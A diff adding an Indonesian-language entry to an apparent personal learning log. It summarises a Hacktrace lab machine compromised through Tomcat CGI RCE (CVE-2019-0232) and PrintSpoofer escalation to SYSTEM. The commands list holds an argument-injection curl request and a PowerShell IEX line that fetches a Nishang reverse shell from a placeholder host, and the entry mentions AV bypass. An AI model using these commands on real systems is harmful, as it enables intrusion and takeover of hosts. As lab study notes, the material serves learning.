@@ -4640,5 +4640,60 @@
     ],
     "summary": "Membangun Studio/SI dari nol sampai live: workspace kuliah editorial untuk UT dengan CRUD multi-semester, riwayat lintas semester, kalkulator biaya, SVG timeline, dan mantra harian. Backend Supabase (Postgres + Auth + RLS) dengan arsitektur sync-ready. Deploy ke GitHub Pages. Banyak waktu dihabiskan debugging sistem dua-lapis penyimpanan dan memahami model keamanan anon key vs RLS — pelajaran penting: jangan menebak, lihat data langsung.",
     "url": "https://trwbcy.github.io/university/"
+  },
+  {
+    "id": "hacktrace-fenrir",
+    "date": "2026-06-25",
+    "title": "Fenrir — Tomcat CGI RCE (CVE-2019-0232) + PrintSpoofer SeImpersonate ke SYSTEM (Moderate, Hacktrace)",
+    "platform": "Hacktrace Ranges",
+    "category": "Offensive Security",
+    "tags": [
+      "web",
+      "tomcat",
+      "cgi",
+      "rce",
+      "cve-2019-0232",
+      "token-impersonation",
+      "seimpersonate",
+      "printspoofer",
+      "windows-privesc",
+      "windows",
+      "moderate"
+    ],
+    "concepts": [
+      "Apache Tomcat 9.0.17 CGI Servlet enableCmdLineArguments RCE (CVE-2019-0232) via manual argument injection",
+      "Manual exploitation lebih reliable daripada modul Metasploit yang flaky di lab",
+      "Workaround stdout buffering CGI Servlet: PowerShell IEX download Nishang Invoke-PowerShellTcp",
+      "LOLscript (Nishang) untuk AV bypass dibanding payload msfvenom encoded",
+      "Windows privilege escalation via SeImpersonatePrivilege dengan PrintSpoofer",
+      "cmd /c wrapper untuk fix nested quoting error pada CreateProcessAsUser"
+    ],
+    "terms": [
+      "CVE-2019-0232",
+      "Apache Tomcat 9.0.17",
+      "CGI Servlet",
+      "enableCmdLineArguments",
+      "SeImpersonatePrivilege",
+      "PrintSpoofer",
+      "Nishang",
+      "Invoke-PowerShellTcp",
+      "PowerShell IEX",
+      "CreateProcessAsUser",
+      "Token Impersonation"
+    ],
+    "commands": [
+      "nmap -sVC --min-rate 1000 -p- -Pn -T4 -oN nmap-fenrir.log fenrir.htr",
+      "feroxbuster -u http://fenrir.htr -x cgi,bat,cmd",
+      "curl 'http://fenrir.htr/cgi-bin/cmd.bat?&C%3A%5CWindows%5CSystem32%5Cwhoami.exe'",
+      "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://<ip>/Invoke-PowerShellTcp.ps1')\"",
+      "PrintSpoofer.exe -c \"cmd /c <command>\"  (fix nested quoting via cmd /c wrapper)"
+    ],
+    "problems": [
+      "Modul Metasploit untuk CVE-2019-0232 terbukti flaky; beralih ke eksploitasi manual via curl.",
+      "Stdout quirk pada direct invocation cmd.exe/powershell.exe lewat CGI Servlet — output tidak konsisten; di-workaround dengan PowerShell IEX reverse shell (Nishang).",
+      "CreateProcessAsUser nested quoting error pada PrintSpoofer di-fix dengan cmd /c wrapper."
+    ],
+    "summary": "Mesin Windows Moderate. Apache Tomcat 9.0.17 CGI Servlet enableCmdLineArguments RCE (CVE-2019-0232) dieksploitasi manual via curl setelah modul Metasploit terbukti flaky. Stdout quirk pada cmd.exe/powershell.exe direct invocation di-workaround dengan PowerShell IEX download Nishang Invoke-PowerShellTcp untuk AV bypass. Eskalasi via SeImpersonatePrivilege menggunakan PrintSpoofer dengan cmd /c wrapper untuk fix nested quoting error CreateProcessAsUser. User dan root flag captured.",
+    "url": ""
   }
 ]
